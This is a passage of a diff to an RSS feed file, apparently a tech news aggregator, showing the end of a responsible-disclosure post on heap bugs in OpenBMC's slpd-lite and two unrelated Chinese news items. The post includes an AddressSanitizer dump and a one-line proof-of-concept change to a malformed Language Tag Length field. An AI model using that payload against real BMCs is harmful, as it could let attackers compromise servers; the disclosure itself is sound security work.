+</span></span><span><span>  0x0c607fff9f80: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>  0x0c607fff9f90: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>  0x0c607fff9fa0: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>  0x0c607fff9fb0: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span><span>=</span>&gt;0x0c607fff9fc0: 00<span>[</span>06<span>]</span>fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span><span>  0x0c607fff9fd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span><span>  0x0c607fff9fe0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span><span>  0x0c607fff9ff0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span><span>  0x0c607fffa000: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>  0x0c607fffa010: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>Shadow byte legend <span>(</span>one shadow byte represents <span>8</span> application bytes<span>)</span>:
+</span></span><span><span>  Addressable:           <span>00</span>
+</span></span><span><span>  Partially addressable: <span>01</span> <span>02</span> <span>03</span> <span>04</span> <span>05</span> <span>06</span> <span>07</span>
+</span></span><span><span>  Heap left redzone:       fa
+</span></span><span><span>  ...&lt;snip&gt;...
+</span></span></code></pre></div><p>The second vulnerability can instead be triggered by changing the Language Tag Length field to be the following in <code>poc.py</code>.</p>
+<div><pre tabindex="0"><code data-lang="py"><span><span><span>b</span><span>'</span><span>\xfd\xe8</span><span>'</span> <span>+</span>  <span># Language Tag Length</span>
+</span></span></code></pre></div>
+<h3>Technical Impact
+<span>
+<a href="#technical-impact" aria-label="Anchor">#</a>
+</span>
+</h3>
+<p>Successful exploitation of this vulnerability would allow a network-resident (or remote attacker, depending upon the deployment) to fully compromise a BMC.</p>
+<h3>Exploitation Conditions
+<span>
+<a href="#exploitation-conditions" aria-label="Anchor">#</a>
+</span>
+</h3>
+<p>To exploit this vulnerability, an attacker would usually require access to the BMC management network.</p>
+<p>However, it is unfortunately common for integrators to expose their BMC network services to the internet, hence an argument for an elevated severity for this finding:</p>
+<ul>
+<li><a href="https://threatpost.com/ipmi-protocol-bmc-vulnerabilities-expose-thousands-of-servers-to-attack/101202/" target="_blank">Threatpost: <em>IPMI Protocol, BMC Vulnerabilities Expose Thousands of Servers to Attack</em></a></li>
+<li><a href="https://eclypsium.com/research/virtual-media-vulnerability-in-bmc-opens-servers-to-remote-attack/" target="_blank">Eclypsium: <em>Virtual Media Vulnerability in BMC Opens Servers to Remote Attack</em></a></li>
+<li><a href="https://isc.sans.edu/diary/28276" target="_blank">SANS Technology Institute: <em>Over 20 thousand servers have their iLO interfaces exposed to the internet…</em></a></li>
+</ul>
+<h2>Disclosure Timeline
+<span>
+<a href="#disclosure-timeline" aria-label="Anchor">#</a>
+</span>
+</h2>
+<ul>
+<li><strong>May 22, 2024</strong> - Tetrel reports issues to the OpenBMC’s security mailing list in the <a href="https://github.com/openbmc/docs/security" target="_blank">OpenBMC Security Policy</a></li>
+<li><strong>May 28, 2024</strong> - <em>slpd-lite</em> developers patch issues</li>
+<li><strong>July 29, 2024</strong> - OpenBMC <a href="https://github.com/openbmc/slpd-lite/security/advisories/GHSA-wmgv-jffg-v3xr" target="_blank">publishes advisory</a> and <a href="https://github.com/openbmc/openbmc/commit/350cb5f326d52aa7bb6c423e07fdaf26292f3541" target="_blank">applies patch</a> to the OpenBMC project</li>
+<li><strong>August 16, 2024</strong> - Tetrel publishes vulnerability details (this post)</li>
+</ul>
+<p>Thanks to <a href="https://github.com/geissonator" target="_blank">Andrew Geissler</a> and the OpenBMC Security Response Team for the rapid fix and advisory release!</p>
+<p><sup>ASPEED BMC Photo by <a href="https://commons.wikimedia.org/wiki/User:Phiarc" target="_blank">Phiarc</a>. CC BY-SA 4.0.</sup></p>
+</div>
+</div>
+</section>
+<footer>
+</footer>]]></content:encoded>
+    
+    <pubDate>Sat, 17 Aug 2024 21:34:56 +0800</pubDate>
+  </item><item>
     <title><![CDATA[研究发现更大规模的团队减少创新限制晋升希望]]></title>
     <link>https://www.solidot.org/story?sid=79003</link>
     <itunes:title><![CDATA[研究发现更大规模的团队减少创新限制晋升希望]]></itunes:title>
@@ -4663,25 +5811,5 @@ https://www.nature.com/articles/s42003-024-06643-2<br>
 https://news.sciencenet.cn/htmlnews/2024/8/528116.shtm]]></content:encoded>
     
     <pubDate>Thu, 15 Aug 2024 14:57:36 +0800</pubDate>
-  </item><item>
-    <title><![CDATA[日本今天将解除南海海槽地震预警]]></title>
-    <link>https://www.solidot.org/story?sid=78984</link>
-    <itunes:title><![CDATA[日本今天将解除南海海槽地震预警]]></itunes:title>
-    <itunes:author><![CDATA[奇客Solidot[RSS+]]]></itunes:author>
-    <itunes:summary>
-      <![CDATA[从 8 月 8 日以日向滩为震源发生地震之后，日本气象厅每天发布“南海海槽地震相关解说信息”。主要提供自 8 月 8 日以来的地震发生次数以及地下岩层产生的“应变变化”的信息，并呼吁注意巨大地震。如无特别异常，将于 8 月 15 日下午 5 点停止发布提醒和提供信息。跟踪显示，在南海海槽地震的预想震源区域内，未观测到显示板块边界固着状况有特别变化的地震活动或地壳运动。之所以设定发布提醒时间为一周，是因为大规模地震的发生可能性随着时间的推移而降低，而且长期持续防灾是困难的。
-<br>
-https://cn.nikkei.com/politicsaeconomy/politicsasociety/56431-2024-08-15-11-23-44.html]]>
-    </itunes:summary>
-    <description>
-      <![CDATA[从 8 月 8 日以日向滩为震源发生地震之后，日本气象厅每天发布“南海海槽地震相关解说信息”。主要提供自 8 月 8 日以来的地震发生次数以及地下岩层产生的“应变变化”的信息，并呼吁注意巨大地震。如无特别异常，将于 8 月 15 日下午 5 点停止发布提醒和提供信息。跟踪显示，在南海海槽地震的预想震源区域内，未观测到显示板块边界固着状况有特别变化的地震活动或地壳运动。之所以设定发布提醒时间为一周，是因为大规模地震的发生可能性随着时间的推移而降低，而且长期持续防灾是困难的。
-<br>
-https://cn.nikkei.com/politicsaeconomy/politicsasociety/56431-2024-08-15-11-23-44.html]]>
-    </description>
-    <content:encoded><![CDATA[从 8 月 8 日以日向滩为震源发生地震之后，日本气象厅每天发布“南海海槽地震相关解说信息”。主要提供自 8 月 8 日以来的地震发生次数以及地下岩层产生的“应变变化”的信息，并呼吁注意巨大地震。如无特别异常，将于 8 月 15 日下午 5 点停止发布提醒和提供信息。跟踪显示，在南海海槽地震的预想震源区域内，未观测到显示板块边界固着状况有特别变化的地震活动或地壳运动。之所以设定发布提醒时间为一周，是因为大规模地震的发生可能性随着时间的推移而降低，而且长期持续防灾是困难的。
-<br>
-https://cn.nikkei.com/politicsaeconomy/politicsasociety/56431-2024-08-15-11-23-44.html]]></content:encoded>
-    
-    <pubDate>Thu, 15 Aug 2024 14:16:04 +0800</pubDate>
   </item></channel>
 </rss>
